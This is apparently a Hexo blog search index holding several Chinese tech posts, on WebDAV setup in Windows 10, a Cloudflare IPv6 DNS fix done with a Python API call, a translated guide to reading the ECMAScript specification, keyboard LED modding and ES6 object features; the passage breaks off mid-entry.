<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>Win10 资源管理器的 webdav 配置</title>
      <link href="2022/07/10/Win10%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84webdav%E9%85%8D%E7%BD%AE/"/>
      <url>2022/07/10/Win10%E8%B5%84%E6%BA%90%E7%AE%A1%E7%90%86%E5%99%A8%E7%9A%84webdav%E9%85%8D%E7%BD%AE/</url>
      
        <content type="html"><![CDATA[<p>昨天在闲鱼买的极路由 4 增强版，想用来做个下载器，挂载个硬盘。</p><p>用恩山大佬魔改的的 padavan4.4 <a href="https://www.right.com.cn/forum/thread-8154809-1-1.html" target="_blank" rel="noopener">固件</a>，固件里面的 ftp 和 smb 在 Win10 上不好用。</p><p>这个 ftp 进去后没法修改文件，smb 就压根连不上。</p><p>后来又在恩山搜到了 <a href="https://www.right.com.cn/forum/thread-7993472-1-1.html" target="_blank" rel="noopener">一个基于 webdav 协议的软件</a></p><p>下载运行了以后，发现 windows 的资源管理器连接不上。而且打点的视频文件直接打不开。</p><p>搜了一下，发现需要修改注册表，将 webclient 的参数改了就 OK 了。参考了一个 <a href="https://github.com/messense/aliyundrive-webdav/issues/117" target="_blank" rel="noopener">Github issue</a></p><p><img src="/images/B2iT9ER7pdDZ9dxvAkISppqRJZMFN56nrrN9Q-TJR6w.png" alt="image"></p><p>用着还行吧，凑合用不折腾了。</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Windows </tag>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>我的域名怎么解析成了 IPv6？</title>
      <link href="2022/05/09/%E6%88%91%E7%9A%84%E5%9F%9F%E5%90%8D%E6%80%8E%E4%B9%88%E8%A7%A3%E6%9E%90%E6%88%90%E4%BA%86IPv6%EF%BC%9F/"/>
      <url>2022/05/09/%E6%88%91%E7%9A%84%E5%9F%9F%E5%90%8D%E6%80%8E%E4%B9%88%E8%A7%A3%E6%9E%90%E6%88%90%E4%BA%86IPv6%EF%BC%9F/</url>
      
        <content type="html"><![CDATA[<p>今天魔法突然不能用了，魔法的输出突然多了很多 IPv6 地址。<br>去终端 ping 一下域名，结果是 IPv6 地址。。。<br>猜测是 Cloudflare 的问题，搜了一下，果然有人写过这个问题。</p><p><a href="https://www.vvso.cn/xlbk/2079.html" target="_blank" rel="noopener">https://www.vvso.cn/xlbk/2079.html</a></p><p>按照文章做了，结果终端提示</p><blockquote><p>curl: (35) schannel: next InitializeSecurityContext failed: Unknown error (0x80092012) - 吊销功能无法检查证书是否吊销。</p></blockquote><p>没办法，用 Python 试一下吧。</p><pre><code class="python">import requestsr = requests.patch(&#39;改成你的&#39;, headers={&#39;X-Auth-Email&#39;: &#39;改成你的&#39;, &#39;X-Auth-Key&#39;:&#39;改成你的&#39;,&#39;Content-Type&#39;:&#39;application/json&#39;},json={&quot;value&quot;:&quot;off&quot;})print(r.content)</code></pre><p>成功了，过了几分钟变成 IPv4 地址了😁</p>]]></content>
      
      
      <categories>
          
          <category> 备忘录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>如何读 ECMAScript 规范（二）</title>
      <link href="2022/04/04/%E5%A6%82%E4%BD%95%E8%AF%BBECMAScript%E8%A7%84%E8%8C%83%EF%BC%88%E4%BA%8C%EF%BC%89/"/>
      <url>2022/04/04/%E5%A6%82%E4%BD%95%E8%AF%BBECMAScript%E8%A7%84%E8%8C%83%EF%BC%88%E4%BA%8C%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>本文翻译自：</p><p><a href="https://timothygu.me/es-howto/" target="_blank" rel="noopener">https://timothygu.me/es-howto/</a></p><h2 id="运行时语义"><a href="#运行时语义" class="headerlink" title="运行时语义"></a>运行时语义</h2><p>语言和 api 的运行时语义是规范中最重要的部分，通常是人们最关心的问题。</p><p>总的来说，在规范中阅读这些章节是非常简单的。然而，该规范使用了大量的速记，这些速记刚刚开始 (至少对我来说) 是相当讨厌的。我将尝试解释其中的一些约定，然后将它们应用到一个通常的工作流程中，以弄清楚几件事情是如何工作的。</p><h3 id="算法步骤"><a href="#算法步骤" class="headerlink" title="算法步骤"></a>算法步骤</h3><p>ECMAScript 中的大多数运行时语义是由一系列算法步骤指定的，与伪代码没有什么不同，但形式精确得多。</p><p><img src="/images/WZwocpQ6T6KKkv5QjHIq_dHiST4igA9mdTQc5sMtasM.png" alt="image"></p><h3 id="抽象的操作"><a href="#抽象的操作" class="headerlink" title="抽象的操作"></a>抽象的操作</h3><p>您有时会在规范中看到调用类似函数的内容。</p><p>Boolean()函数：</p><p><img src="/images/mDVctygjTBWTqcJHD9AcpaD-WzfbHMdzei9ZCxLLBrU.png" alt="image"></p><p>“<a href="https://tc39.es/ecma262/#sec-toboolean" target="_blank" rel="noopener">ToBoolean</a>”函数被称为抽象的操作。抽象的原因是它实际上并没有作为 JavaScript 代码的函数公开。它只是一个规范作者发明的符号。</p><p><a href="https://tc39.es/ecma262/#sec-algorithm-conventions-abstract-operations" target="_blank" rel="noopener">抽象操作</a></p><h3 id="什么是-This"><a href="#什么是-This" class="headerlink" title="什么是 [[This]]"></a>什么是 [[This]]</h3><p>有时，您可能会看到 [[符号 ]]被使用，例如 “Let proto be obj.[[Prototype]]“。</p><p>从技术上讲，这种表示法可以表示几种不同的东西，这取决于它出现的上下文。要理解这种表示法指的是一些无法通过 JavaScript 代码观察到的内部属性。</p><p>确切地说，它可能意味着三种不同的东西，我将用规范中的示例来说明。但是，现在请随意跳过它们。</p><h4 id="记录-amp-字段"><a href="#记录-amp-字段" class="headerlink" title="记录 &amp; 字段"></a>记录 &amp; 字段</h4><p>ECMAScript 规范使用术语 <strong>Record</strong> 来指代具有一组固定键的键值映射 – 有点像类 C 语言中的 ** 结构体 **。</p><p>记录（Record）的每个键值对（key-value）称为一个 ** 字段 **（field）。由于记录只能出现在规范中，而不能出现在实际的 JavaScript 代码中，因此使用 <code>[[Notation]]</code> 来引用记录 (Record) 的字段(field)。</p><blockquote><p>值得注意的是，属性描述符还建模为具有 field: [[Value]]、[[Wwriteable]]、[[Get]]、[[Set]]、[[Enumerable]]和 [[Configurable]]的 Record。IsDataDescriptor 抽象操作广泛使用以下表示法：</p></blockquote><blockquote><p>当使用属性描述符 Desc 调用抽象操作 IsDataDescriptor 时，将执行以下步骤：</p></blockquote><blockquote><ol><li>如果 Desc 是 undefined，返回 false</li><li>如果 <code>Desc.[[Value]]</code> 和 <code>Desc.[[Writeable]]</code> 缺失，返回 false</li><li>返回 true</li></ol></blockquote><h4 id="JavaScript-对象的内部插槽"><a href="#JavaScript-对象的内部插槽" class="headerlink" title="JavaScript 对象的内部插槽"></a>JavaScript 对象的内部插槽</h4><p>JavaScript 对象可能具有所谓的内部插槽，规范使用这些插槽来保存其中的数据。</p><p>与记录字段一样，这些内部插槽也无法使用 JavaScript 进行观察，但其中一些可以通过特定于实现的工具（如 Google Chrome 的 DevTools）公开。因此，使用 <code>[[记号]]</code> 来描述内部插槽也是有意义的。</p><p>内部插槽的细节将在 § 2.5 JavaScript Objects 中介绍。现在，不要太担心它们的用途，但请注意以下示例。</p><blockquote><p>大多数 JavaScript 对象有一个内部插槽 [[Prototype]]，引用了它们所继承的对象。这个内部插槽的值通常是 <code>Object.getProrotypeOf()</code> 方法的返回值。在 OrdinaryGetPrototypeOf 抽象操作中，访问此内部插槽的值：</p></blockquote><blockquote><p>当使用对象 O 调用抽象操作 OrdinaryGetPrototypeOf 时，将执行以下步骤：</p></blockquote><blockquote><ol><li>返回 <code>O.[[Prototype]]</code></li></ol></blockquote><blockquote><p>注： “对象” 和 “记录” 字段的内部槽在外观上是相同的，但可以通过查看记号（点运算符之前的部分）来消除歧义，无论是对象还是记录。可以在上下文中看出。</p></blockquote><h4 id="JavaScript-对象的内部方法"><a href="#JavaScript-对象的内部方法" class="headerlink" title="JavaScript 对象的内部方法"></a>JavaScript 对象的内部方法</h4><p>JavaScript 对象也可能具有所谓的内部方法。与内部插槽一样，这些内部方法无法通过 JavaScript 直接观察到。</p><p>因此，使用 <code>[[记号]]</code> 来描述内部方法也是有意义的。</p><p>内部方法的细节将在 § 2.5 JavaScript Objects 中介绍。现在，不要太担心它们的用途，但请注意以下示例。</p><blockquote><p>所有的 JavaScript 函数都有一个内部方法 [[Call]]，它运行函数。<a href="https://tc39.es/ecma262/#sec-call" target="_blank" rel="noopener">Call 抽象操作</a></p></blockquote><h3 id="完成记录；-和！"><a href="#完成记录；-和！" class="headerlink" title="完成记录；? 和！"></a>完成记录；? 和！</h3><p>ECMAScript 规范中的每个运行时语义都显式或隐式返回一个报告其结果的完成记录（Completion Records）。此完成记录是具有三个可能字段的记录（Record）：</p><ul><li>一个 <code>[[Type]]</code> (normal, return,throw,break,contintue)</li><li>如果 <code>[[Type]]</code> 是 normal，return 或者 throw，它可以额外有一个 <code>[[Value]]</code> (返回 / 抛出了什么)</li><li>如果 <code>[[Type]]</code> 是 break 或者 continue，则它可以选择携带一个称为 <code>[[Target]]</code> 的标签，脚本执行会因为此运行时语义而中断 / 继续执行该标签。<blockquote><p>注意：<code>[[]]</code> 也用来表示记录 (Records) 的字段(fields)。</p></blockquote></li></ul><p><code>[[Type]]</code> 为 normal 时的完成记录称为 *<em>normal 完成 *</em>。其他 <code>[[Type]]</code> 的完成记录称为 *<em>abrupt 完成 *</em>。</p><p>大多数时候，你只会与 <code>[[Type]]</code> 为 throw 的 <strong>abrupt 完成 ** 打交道。其他三种（return，break，continue）</strong>abrupt 完成 ** 类型仅用于查看如何评估特定语法元素。</p><p>事实上，您将永远不会在内置函数的定义中看到 normal 和任何其他类型，因为中断 / 继续 / 返回不能跨函数边界工作。</p><blockquote><p><a href="https://tc39.es/ecma262/#sec-completion-record-specification-type" target="_blank" rel="noopener">规范连接</a></p></blockquote><p>由于完成记录的定义，JavaScript 中的细微差别，如冒泡错误，直到尝试捕获块在规范中不存在。</p><p>事实上，错误（或更确切地说是 abrupt 完成）是显式处理的。</p><p>在没有任何速记的情况下，对抽象操作的普通调用的规范文本可能返回计算结果或引发错误，如下所示：</p><blockquote><p>调用抽象操作的几个步骤，该操作可能在没有任何速记的情况下抛出：</p></blockquote><blockquote><ol><li>设 resultCompletionRecord 是一个 AbstractOp()。<ol><li>注意，resultCompletionRecord 是一个完成记录</li></ol></li><li>如果 resultCompletionRecord 是一个 abrupt 记录，返回 resultCompletionRecord<ol><li>注意，这里，resultCompletionRecord 如果是 abrupt 完成，直接返回。换句话说，将在 AbstractOp 中引发错误，并中止其余步骤。</li></ol></li><li>设 result 是 <code>resultCompletionRecord.[[Value]]</code> <ol><li>注意，在确保我们获得正常完成之后，我们现在可以解开完成记录的包装，以获得我们需要的计算的实际结果。</li></ol></li><li>result 就是我们需要的结果。</li></ol></blockquote><p>这可能会让你想起 C 中的手动错误处理：</p><pre><code class="javascript">int result = abstractOp();              // Step 1if (result &lt; 0)                         // Step 2  return result;                        // Step 2 (continued)                                        // Step 3 is unneeded// func() succeeded; carrying on...     // Step 4</code></pre><p>但是为了减少这些步骤，ECMAScript 规范的编辑器添加了一些速记（shorthands）。</p><p>自 ES2016 起，相同的规范文本可以改为以以下两种等效方式编写：</p><blockquote><p>调用抽象操作的几个步骤可能抛出 <code>ReturnIfAbrupt</code> </p></blockquote><blockquote><ol><li>设 result 是 AbstractOp()。<ol><li>注意，这里，就像上面的 step1，result 是一个完成记录</li></ol></li><li><a href="https://tc39.es/ecma262/#sec-returnifabrupt" target="_blank" rel="noopener">ReturnIfAbrupt</a>(result)<ol><li>注意，ReturnIfAbrupt 通过转发来处理任何可能的 abrupt 完成，并自动将结果解包到其 <code>[[Value]]</code> 中。</li></ol></li><li>result 就是我们想要的结果。</li></ol></blockquote><p>或者，更简洁地说，用一个特殊的问号（？）表示法：</p><blockquote><p>调用抽象操作的几个步骤可能抛出 <code>问号标记(?)</code> </p></blockquote><blockquote><ol><li>设 result 是？AbstractOp()<ol><li>注意：在此表示法中，我们根本不处理完成记录。这个？速记为我们处理一切，结果可以立即使用。</li></ol></li><li>result 就是我们想要的结果。</li></ol></blockquote><p>有时，如果我们知道对 AbstractOp 的特定调用永远不会返回 abrupt 完成，它可以向读者传达有关规范意图的更多信息。在这些情况下，使用感叹号 （！）</p><blockquote><p>调用抽象操作的几个步骤永远不抛出的 <code>感叹号标记(!)</code> </p></blockquote><blockquote><ol><li>设 result 是! AbstractOp()<ol><li>注意，？可能会带来任何错误，而！断言我们这次调用永远不会得到任何 abrupt 完成，如果我们这样做，那将是规范中的一个错误。就像？的情况，我们完全不处理完成记录。result 在这之后是立即可用的。</li></ol></li><li>result 就是我们想要的结果。</li></ol></blockquote><p>注意，<code>!</code> 看起来像一个有效的 JavaScript 表达式，可能会变得非常混乱：<code>!ToBoolean(value)</code></p><p>在这里，！只是意味着我们确信对 ToBoolean 的调用永远不会返回异常，而不是布尔取反。</p>]]></content>
      
      
      <categories>
          
          <category> 转载记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>动手给键盘加灯</title>
      <link href="2022/04/04/%E5%8A%A8%E6%89%8B%E7%BB%99%E9%94%AE%E7%9B%98%E5%8A%A0%E7%81%AF/"/>
      <url>2022/04/04/%E5%8A%A8%E6%89%8B%E7%BB%99%E9%94%AE%E7%9B%98%E5%8A%A0%E7%81%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="所需材料："><a href="#所需材料：" class="headerlink" title="所需材料："></a>所需材料：</h2><ul><li>2x3x4 的脚长 18mm 的方灯珠，淘宝 8 块钱 110 个。</li><li>剪灯珠脚的钳子，五块钱左右。</li><li>键盘 &amp; 透光键帽</li></ul><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p>首先需要确定键盘的灯的插孔的正负极，这个键盘上面标了 +-。</p><p><img src="/images/kwiY0ssdRsPsDFGwmZnBWbjHQ8YayDlxeJHR1-YkkVg.jpg" alt=""></p><p>然后，灯珠的长腿是 +</p><p><img src="/images/OyFGgllzYPSGltgmxXGeef9YZuyOdMiZDS8FaQiF3Aw.png" alt=""></p><p>用钳子剪去多余的长度，插入键盘的灯孔里即可。</p><p><img src="/images/2oJVBePrCkB7rH1AsU4AB8-5izNogEPumZzjTj8_iXI.jpg" alt=""></p><p>需要用手折一下针脚，好让其正好撑住灯孔，避免键盘稍有震动造成接触不良。</p><p>最后，三个小时的成果：</p><p><img src="/images/0HWNfqaNy57eSmwI22YMqYa-A1m31zzXtKYbSi7DVqw.png" alt=""></p>]]></content>
      
      
      <categories>
          
          <category> 软硬兼施 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>如何读 ECMAScript 规范（一）</title>
      <link href="2022/04/01/%E5%A6%82%E4%BD%95%E8%AF%BBECMAScript%E8%A7%84%E8%8C%83%EF%BC%88%E4%B8%80%EF%BC%89/"/>
      <url>2022/04/01/%E5%A6%82%E4%BD%95%E8%AF%BBECMAScript%E8%A7%84%E8%8C%83%EF%BC%88%E4%B8%80%EF%BC%89/</url>
      
        <content type="html"><![CDATA[<h1 id="如何读-ECMAScript-规范（一）"><a href="#如何读-ECMAScript-规范（一）" class="headerlink" title="如何读 ECMAScript 规范（一）"></a>如何读 ECMAScript 规范（一）</h1><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><p>本文翻译自：</p><p><a href="https://timothygu.me/es-howto/" target="_blank" rel="noopener">https://timothygu.me/es-howto/</a></p><h2 id="序"><a href="#序" class="headerlink" title="序"></a>序</h2><p>在本文档中，我将仅使用术语 “ECMAScript” 来指代规范本身，而使用 “JavaScript” 来指代其他任何地方。但是，这两个术语都指同一事物。（ECMAScript 和 JavaScript 之间有一些历史上的区别，但讨论这超出了本文档的范围，你可以很容易地用谷歌搜索这种区别。</p><h3 id="我为什么读这个规范"><a href="#我为什么读这个规范" class="headerlink" title="我为什么读这个规范"></a>我为什么读这个规范</h3><p>ECMAScript 规范是所有 JavaScript 实现行为的权威来源，无论是在浏览器中，还是在服务器 Node.js，还是在 IoT 设备上。</p><p>JavaScript 引擎的所有开发人员都依赖于规范来确保其闪亮的新功能按预期工作，就像其他 JavaScript 引擎一样。</p><p>假设有一天在工作中发现了以下奇特的代码：</p><pre><code class="javascript">&gt; Array.prototype.push(42)1&gt; Array.prototype[ 42 ]&gt; Array.isArray(Array.prototype)true&gt; Set.prototype.add(42)TypeError: Method Set.prototype.add called on incompatible receiver #&lt;Set&gt;    at Set.add (&lt;anonymous&gt;)&gt; Set.prototypeSet {}</code></pre><p>为什么 Array 的原型上的 push 方法是可以直接调用的。而 Set 不行？</p><blockquote><p>不幸的是，Google 总是在你最需要的时候失败，一直有用的 Stack Overflow 也是如此。</p></blockquote><p>读规范可以解决。</p><p>或者，您可能想知道臭名昭着的松散相等运算符 <code>==</code> 实际上是如何运作的。勤奋的你在 MDN 上查找它，却发现它的解释段落给你带来的伤害比帮助更大。</p><p>另一方面，我不建议刚接触 JavaScript 的开发人员阅读 ECMAScript 规范。如果你是 JavaScript 的新手，那么就试试 Web 吧！</p><p>当你经历过足够多的 JavaScript 问题，不必担心 JavaScript 时，请考虑返回到本文档。</p><h3 id="哪些属于-or-不属于-ECMAScript-规范"><a href="#哪些属于-or-不属于-ECMAScript-规范" class="headerlink" title="哪些属于 or 不属于 ECMAScript 规范"></a>哪些属于 or 不属于 ECMAScript 规范</h3><table><thead><tr><th>描述</th><th>分类</th></tr></thead><tbody><tr><td>句法元素的语法（即，有效的 for 循环应该是什么样）</td><td>属于规范✔</td></tr><tr><td>句法元素的语义（例如，<code>typeof null</code> 应该返回什么，<code>{ a:b }</code> 应该返回什么</td><td>属于规范✔</td></tr><tr><td>Object, Array, Function, Number, Math, RegExp, Proxy, Map, Promise, ArrayBuffer, Uint8Array, <code>globalThis</code>, …</td><td>属于规范✔</td></tr><tr><td><code>import a from &#39;a&#39;;</code></td><td>规范指定了此类声明的语法以及它们的含义，<br > 但没有指定具体如何加载模块。</td></tr><tr><td>console, setTimeout(), setInterval(), clearTimeout(), clearInterval()</td><td>这些方法在浏览器端和 Node 里都可用，但是属于非标准。<br > 对于 Node，他们属于 Node 规范。对于浏览器，console 被 CONSOLE 标准规范，其余被 HTML 标准规范。</td></tr><tr><td>Buffer, process, global*</td><td>属于 Node 规范。</td></tr><tr><td>module, exports, require(), __dirname, __filename</td><td>这些是 Node.js 模块范围的 “全局变量”，由其文档记录</td></tr><tr><td>window, alert(), confirm(), DOM (document, HTMLElement, addEventListener(), Worker, …)</td><td>只在浏览器存在</td></tr></tbody></table><h3 id="ECMAScript-规范在哪"><a href="#ECMAScript-规范在哪" class="headerlink" title="ECMAScript 规范在哪"></a>ECMAScript 规范在哪</h3><p>[ECMA-262](<a href="https://tc39.es/ecma262/" target="_blank" rel="noopener">https://tc39.es/ecma262/</a>)</p><h3 id="导航"><a href="#导航" class="headerlink" title="导航"></a>导航</h3><p>ECMA 包含巨量信息。尽管作者尽力分隔成单独的部分，但是仍然是巨量。</p><p>个人把规范分为五部分：</p><ul><li>约定和基础知识（什么是 Number？“throw a TypeError exception”是什么意思？）</li><li>语法（如何编写 for-in 循环？）</li><li>语言的静态语义（变量名称是如何在 var 语句中确定的？）</li><li>语言的运行时语义（for-in 循环是如何执行的？）</li><li>API（<code>String.prototype.substring()</code> 做了什么？）</li></ul><p>然而 ECMA 规范没有安装上面的划分。</p><p>第 1 部分在 <a href="https://tc39.es/ecma262/#sec-notational-conventions" target="_blank" rel="noopener">CH5 Notational Convention</a> 到<a href="https://tc39.es/ecma262/#sec-ordinary-and-exotic-objects-behaviours" target="_blank" rel="noopener">CH9 Ordinary and Exotic Objects Behaviours</a></p><p>第 2,3,4 部分以交错的形式在<a href="https://tc39.es/ecma262/#sec-ecmascript-language-source-code" target="_blank" rel="noopener">CH10 ECMAScript Language: Source Code</a> 到 <a href="https://tc39.es/ecma262/#sec-ecmascript-language-scripts-and-modules" target="_blank" rel="noopener">CH15  ECMAScript Language: Scripts and Modules</a></p><p>我想指出的是，绝对没有人从上到下阅读规范。</p><p>相反，只查看与您尝试查找的内容相对应的部分，并且在该部分中仅查看您需要的内容。尝试确定您的具体问题与五大部分中的哪一个相关; 如果你在确定它是哪一个时遇到困难，问问自己一个问题：”这个（无论你试图确认什么）在什么时候被评估？” 这可能会有所帮助。别担心，通过练习，导航规范只会变得更容易。</p><h2 id="运行时语义"><a href="#运行时语义" class="headerlink" title="运行时语义"></a>运行时语义</h2><p>下部分。。。</p>]]></content>
      
      
      <categories>
          
          <category> 转载记录 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> JavaScript </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>深入理解 ES6-ch4 扩展对象的功能性</title>
      <link href="2022/03/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ES6-ch4%E6%89%A9%E5%B1%95%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8A%9F%E8%83%BD%E6%80%A7/"/>
      <url>2022/03/31/%E6%B7%B1%E5%85%A5%E7%90%86%E8%A7%A3ES6-ch4%E6%89%A9%E5%B1%95%E5%AF%B9%E8%B1%A1%E7%9A%84%E5%8A%9F%E8%83%BD%E6%80%A7/</url>
      
        <content type="html"><![CDATA[<h2 id="可计算属性名"><a href="#可计算属性名" class="headerlink" title="可计算属性名"></a>可计算属性名</h2><p>现在，属性可以在字面量中直接写</p><pre><code class="javascript">let p = &quot;a b c&quot;;let a = {[p]: &#39;123&#39;;}</code></pre><p>ES5 不能直接写，只能这么写：</p><pre><code class="javascript">var p = &quot;a b c&quot;;var a = { };a[p] = &#39;1 2 3&#39;;</code></pre><h2 id="新增方法"><a href="#新增方法" class="headerlink" title="新增方法"></a>新增方法</h2><h5 id="Object-is"><a href="#Object-is" class="headerlink" title="Object.is()"></a>Object.is()</h5><p>严格相等运算 <code>===</code> 不会触发强制类型转换，但是也有不准确的时候。</p><pre><code class="javascript">+0 === -0 // trueNaN === NaN // false</code></pre><p>在 JS 中，<code>-0</code> 和 <code>+0</code> 是不同的实体。应该是 false。NaN 与自身比较应该是 true。</p><p>ES6 引入了 <code>Object.is()</code> 弥补全局运算符的不准确。</p><p><code>===</code> 与 <code>Object.is()</code> 的唯一区别就是 <code>+0,-0 ,NaN</code> 这两种情况。</p><pre><code class="javascript">Object.is(+0, -0) //falseObject.is(NaN, NaN) // true</code></pre><p>当你的严格相等代码中，有可能出现以上两种情况，考虑使用 Object.is</p><h5 id="Object-assign"><a href="#Object-assign" class="headerlink" title="Object.assign"></a>Object.assign</h5><p>混合（mixin）是 JS 中对象组合的常见模式。</p><p>例如</p><pre><code class="javascript">function mixin(receiver, supplier){    Object.keys(supplier).forEach(function(key)) {        receiver[key] = supplier[key];    });    return receiver;}</code></pre><p>mixin 函数遍历 supplier 的自有属性并复制到 receiver 中（浅复制）。使得 receiver 可以不通过继承，获得属性。</p><pre><code class="javascript">function EventTarget() {}EventTarget.prototype = {    constructor: EventTarget,    emit: function(){},    on: function(){}};var myObj = {};mixin(myObj, EventTarget.prototype);myObj.emit(&quot;somethingChanged&quot;);</code></pre><p>这里，myObj 接收了 EventTarget.prototype 对象的所有行为，从而可以使用 emit 发布事件，可以通过 on 订阅事件。</p><p>ES6 的 <code>Object.assign</code> 方法实现了上面的 mixin 的功能</p><pre><code class="javascript">Object.assign(接收对象，源对象 1，源对象 2，源对象 3。。。)</code></pre><p>注意，assign 不能复制访问器属性（getter 和 setter），并且访问器属性的 <code>enumerable</code> 是 true 时才能被 assign 方法发现，如下所示：</p><pre><code class="javascript">// assign 不能复制访问器属性let supplier = {    age: 18,}Object.defineProperty(supplier, &#39;year&#39;, {    get() {        console.log(&#39;调用了 get&#39;);        return this.age;    },    set(value) {        console.log(&#39;set 被调用了&#39;);        this.age = value;    },    enumerable: true,})supplier.year = 2022;// 都改成了 2022console.log(supplier.age);console.log(supplier.year);let myObj = {};Object.assign(myObj, supplier);console.log(myObj.age);console.log(myObj.year);myObj.year = 2021;// age 没有变，说明 assign 没有复制访问器属性（getter 和 setter）console.log(myObj.age);console.log(myObj.year);</code></pre><p>supplier 的访问器属性会变为接收器对象的一个数据属性。不再是访问器属性。</p><p>assign 可以接 N 个源对象，排名靠后的对象会覆盖前面的同名属性。</p><h5 id="字面量对象的重复属性"><a href="#字面量对象的重复属性" class="headerlink" title="字面量对象的重复属性"></a>字面量对象的重复属性</h5><p>ES6 字面量中重复定义的属性，不会报错，不管是严格和非严格模式。</p><p>值取最后定义的。</p><h5 id="自有属性的枚举顺序"><a href="#自有属性的枚举顺序" class="headerlink" title="自有属性的枚举顺序"></a>自有属性的枚举顺序</h5><p>ES6 严格规定明确了自有属性被枚举时的返回顺序。</p><p>被影响的方法：Obejct.assign, Object.getOwnPropertyNames,Reflect.ownKeys 等等。</p><p>ES6 没有明确  <code>for-in</code> 循环的属性枚举顺序。Object.keys 和 JSON.stringify 与 for-in 顺序相同，因此 ES6 也没有明确。(Chrome V100 的顺序与 ES 的枚举顺序一致)</p><p>顺序规则：</p><ol><li>数字 key 按升序排序</li><li>字符串 key 按照 ** 被加入对象的顺序 ** 排序</li><li>所有 symbol 按照 ** 被加入对象的顺序 ** 排序</li></ol><pre><code class="javascript">let obj = {    0: 1,    3: 1,    bz: 1,    b: 1,    bb: 1,    az: 1,    ab: 1,    1: 1,    &quot;-2&quot;: 1,    &quot;-1&quot;: 1}obj[2] = 1;obj[-0] = 1;obj[-1] = 1;console.log(Object.getOwnPropertyNames(obj).join(&#39;-&#39;));// Chrome 100 结果：0-1-2-3-bz-b-bb-az-ab--2--1-a</code></pre><ul><li>对于数字，在枚举时被重新排序。</li><li>字符串键在数字键后面。顺序是声明顺序和插入对象的顺序。</li><li>负数只按照前面的 “-” 排序，视为字符串。</li></ul><h5 id="增强的对象原型"><a href="#增强的对象原型" class="headerlink" title="增强的对象原型"></a>增强的对象原型</h5><p>一般情况，无论是构造函数，还是 Object.create 方法创建的对象，原型都是在对象被创建时指定的。</p><p>ES5 的原则是，在实例化之后，对象原型保持不变。但是 ES5 缺少实例化后改变原型的标准方法。ES5 的 <code>Object.getPrototypeOf()</code> 用来返回指定对象的原型。</p><p>在 ES6，又新增了 <code>Obejct.setPrototypeOf()</code> 方法，用来改变指定对象的原型。</p><p>代码如下：</p><pre><code class="javascript">let person = {    getGreeting() {        return &#39;hello&#39;;    }}let dog = {    getGreeting() {        return &#39;baibai&#39;;    }}let friend = Object.create(person);console.log(friend.getGreeting());  // helloconsole.log(Object.getPrototypeOf(friend) === person);  //trueObject.setPrototypeOf(friend, dog);console.log(friend.getGreeting());  // baibaiconsole.log(Object.getPrototypeOf(friend) === dog);  //true</code></pre><h5 id="用来简化原型访问的-Super"><a href="#用来简化原型访问的-Super" class="headerlink" title="用来简化原型访问的 Super"></a>用来简化原型访问的 Super</h5><p>在 ES5，你想重写对象实例的方法，又需要调用与它同名的原型方法，代码如下：</p><pre><code class="javascript">// 在 ES5，你想重写对象实例的方法，又需要调用与它同名的原型方法，代码如下：let person = {    id: &#39;#human&#39;,    getGreeting() {        return this.id + &#39;hello&#39;;    }}let dog = {    id: &#39;animal&#39;,    getGreeting() {        return this.id + &#39;baibai&#39;;    }}let friend = {    id: &#39;#friend&#39;,    getGreeting() {        return Object.getPrototypeOf(this).getGreeting.call(this) + &quot;, hi!&quot;;    }}Object.setPrototypeOf(friend, person);console.log(friend.getGreeting());  // #friend hello, hi!</code></pre><p><code>Object.getPrototypeOf(this)</code> 确保得到的是 this（friend）的原型 –person。后面的 call 可以确保 this 的指向的是 friend。如果不加 call，最后打印 <code>#human hello, hi!</code></p><p>ES6 的 super 引用相当于指向对象原型的指针，相当于 <code>Object.getPrototypeOf(this)，</code> 代码如下：</p><pre><code class="javascript">let friend = {    id: &#39;#friend&#39;,    getGreeting() {        return super.getGreeting() + &quot;, hi!&quot;;    }}Object.setPrototypeOf(friend, person);console.log(friend.getGreeting());  // #friend hello, hi!</code></pre><blockquote><p>super 不能在非简写方法中使用，会报错 <code>SyntaxError: &#39;super&#39; keyword unexpected here</code>：</p></blockquote><pre><code class="javascript">let friend = {    id: &#39;#friend&#39;,    getGreeting: function () {        return super.getGreeting() + &quot;, hi!&quot;;    }}</code></pre><p>多重继承时，用 ES5 的 Object.getPrototypeOf(this)会出现循环引用的问题，代码如下：</p><pre><code class="javascript">// super 对于多重继承很有用let friend = {    id: &#39;#friend&#39;,    getGreeting() {        // ES5 的方式在多重继承时会有问题，造成循环调用        console.log(this.id);        return Object.getPrototypeOf(this).getGreeting.call(this) + &quot;, hi!&quot;;   }}Object.setPrototypeOf(friend, person);// relative 原型是 friendlet relative = Object.create(friend);console.log(relative.getGreeting());</code></pre><p>RangeError: Maximum call stack size exceeded。</p><p>因为 <code>relative.getGreeting()</code> 是调用的 <code>friend</code> 的 <code>getGreeting</code> 方法，<code>Object.getPrototypeOf(this)</code> 中的 <code>this</code> 指向的是 <code>relative</code>，调用 <code>Object.getPrototypeOf(this)</code> 的结果返回的就是 <code>friend</code> 对象，此时造成 <code>friend.getGreeting</code> 的循环调用。</p><p>使用 super，以上问题迎刃而解，代码如下：</p><pre><code class="javascript">let friend = {    id: &#39;#friend&#39;,    getGreeting() {        // ES5 的方式在多重继承时会有问题，造成循环调用        console.log(this.id);        return super.getGreeting() + &quot;, hi!&quot;;    }}</code></pre>]]></content>
      
      
      <categories>
          
          <category> 读书笔记 </category>
          
      </categories>
      
      
        <tags>
            
